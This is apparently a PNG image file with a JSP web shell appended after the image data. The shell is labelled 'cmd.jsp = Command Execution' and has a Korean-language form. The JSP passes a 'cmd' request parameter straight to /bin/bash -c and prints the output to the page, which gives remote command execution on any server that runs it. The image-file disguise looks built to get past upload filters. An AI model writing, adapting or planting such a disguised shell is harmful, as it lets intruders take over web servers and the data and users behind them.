�PNG

   IHDR   x   \   �Yq�   sRGB ���   gAMA  ���a   	pHYs  �  ��o�d  PIDATx^���k�u���~og;�ݸQt�E�^��M��P:�Bj�.��IAtх�x[K"JB4ݨlut�.��A� �b�<�����s����y�~|���z�a컛�����W+�ss�Q�U���4�'`�L���0y&O��	�<�'`�L���0y&O�K�����65����ܐ}����?�/���X�46�7�Y�HU�����|޵���Jw�Cv�`hmu'����ƞ��E:�ɸ7�}���_��߳��}.�ĕ��Xg7���+�5�Scc	7>�P���%�}�`�&���]�=o��r�	ط���3�'jk���������W
`��=���k�큥N�ݱ���̌����xw}�{��؝����G
a���s�cw��5����7�����V6�{���{�����_�1�;�b���\����h�1+��C=k�_	a���h��<%-wP��b{��pg&SX�&mP ܭ���`���e���ݖ ,&O���c�b�����ؠ����`q�2͊K-U��eql���	�;�{��a��x}U���ӫ�h�,�;��=�;O�]��W���]R���`/쟂]P����6X�%557W����Ӱ`�
����t`soP��c��ۭUk�\YYx{�N��^l���gv��#~�"��x�ab|Ō��&u)�+l)~�;O����O��w,��P�4}nw�/SS��ZJ��a��u
��Lأ��E�e8���n�5k��_{�1�X`��-D������4�"��jk]��b�8�%��P��s�_Q�ݲ��׻n���5�0i��P�{�_Q+����GuG6t�3bk�36�����k��X�`��p&���Y0��0�j�����*�epCa\�wZ��i%_�ν�����a��~i����D̕�S[�.wp���Mc������ZZ܁�����᯵̉������F���m��+X�+��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0y&O��	�<�'`�L���0u��.8vt�R�    IEND�B`�<%@ page import="java.util.*, java.io.*" %>
<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (Linux with UTF-8 Support)
//
// by: Unknown
// modified: [현재 날짜]
//
%>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <title>명령 실행</title>
</head>
<body>
    <form method="get">
        <input type="text" name="cmd" placeholder="명령어 입력">
        <input type="submit" value="실행">
    </form>
    <pre>
<%
if (request.getParameter("cmd") != null) {
    String[] command = {"/bin/bash", "-c", request.getParameter("cmd")}; // Linux 명령어 실행
    out.println("실행된 명령어: " + command[2] + "<br>");
    
    ProcessBuilder pb = new ProcessBuilder(command);
    pb.redirectErrorStream(true); // 에러와 일반 출력을 함께 처리
    Process p = pb.start();

    // 프로세스 출력 읽기 (UTF-8 사용)
    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
    
    String line;
    while ((line = reader.readLine()) != null) {
        out.println(line + "<br>");
    }
    reader.close();
    
    // 프로세스 종료 대기
    p.waitFor();
}
%>
    </pre>
</body>
</html>